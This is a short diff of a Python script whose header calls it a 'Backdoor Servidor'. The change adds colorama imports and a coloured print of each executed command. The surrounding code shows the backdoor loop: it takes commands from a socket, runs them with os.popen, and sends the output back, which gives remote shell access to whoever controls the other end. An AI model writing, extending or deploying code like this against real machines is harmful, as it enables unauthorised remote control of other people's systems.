@@ -1,7 +1,7 @@
 """
 Uso: Backdoor Servidor
 Creado: Andrés Hernández Mata
-Version: 2.1.1
+Version: 2.1.2
 Python: 3.9.1
 Fecha: 08 Abril 2020
 """
@@ -9,6 +9,8 @@ Fecha: 08 Abril 2020
 import socket
 import sys
 import os
+from colorama import Fore
+from colorama import Style
 
 os.system("cls")
 
@@ -36,7 +38,7 @@ while True:
             print("[+] Recibiendo Comando...") 
             comando = comando.decode()    
             salida = os.popen(comando)
-            print("[+] Ejecutando...")  
+            print("[+] Ejecutando " + Fore.GREEN + comando + Style.RESET_ALL)  
             salida = salida.read()
             print("[+] Enviando Resultado...")
             salida = salida.encode()
